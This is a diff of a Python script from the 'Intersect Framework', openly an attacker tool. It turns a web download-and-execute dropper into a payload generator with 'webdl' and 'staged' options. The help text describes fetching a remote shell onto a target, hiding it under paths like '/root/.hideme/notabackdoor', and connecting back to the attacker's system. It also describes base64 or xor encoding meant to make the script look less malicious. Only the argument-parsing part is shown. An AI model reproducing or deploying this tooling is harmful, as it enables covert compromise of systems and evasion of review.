@@ -1,25 +1,32 @@
 #!/usr/bin/python
-# Intersect Framework (c) 20120
+# Intersect Framework (c) 2012
 # Simple web download-exec Intersect dropper
 # dl's a remote Intersect shell, saves and executes
 
 
 import os, sys
 import argparse
+from src import core
+from src import encode
 import base64
 
-Droppers = ("Scripts/Droppers/") 
+New_Payloads = ("Scripts/Payloads/") 
+Payload_Templates = ("src/Templates/Payloads")
  
- 
-help = """Once the generated dropper is executed on the target system, --url will be downloaded,
-saved as --file in the --loc directory and then executed. In the dropper script, the download url
-and file locations are encoded with base64. This serves to make the script less malicious at a casual
-glance. """
+help = """Generate an Intersect payload. The 'webdl' option will fetch an Intersect
+shell from a URL, download onto the target and execute. The 'staged' payload will,
+once executed, connect back to the attackers system, download an Intersect shell and
+then execute. Make sure you start a handler for the staged method before using it."""
 
-parser = argparse.ArgumentParser(description=help, prog="dlexec")
-parser.add_argument("--url", help="url download path [http://192.168.1.4/shell]", required=True)
-parser.add_argument("--file", help="remote filename [notabackdoor]", required=True)
-parser.add_argument("--loc", help="remote location [/root/.hideme/]", required=True)
+parser = argparse.ArgumentParser(description=help, prog="payloads")
+parser.add_argument("--type", help="payload to generate", choices=["webdl", "staged"], required=True)
+parser.add_argument("--host", help="local host/IP address")
+parser.add_argument("--port", help="local port number", type=int)
+parser.add_argument("--enc", help="encoding selection", choices=["b64", "xor"])
+parser.add_argument("--url", help="url download path - webdl")
+parser.add_argument("--file", help="remote filename - webdl")
+parser.add_argument("--loc", help="remote location - webdl")
+parser.add_argument("--handler", help="autostart staged handler", action="store")
 args = parser.parse_args()
 
 url = args.url
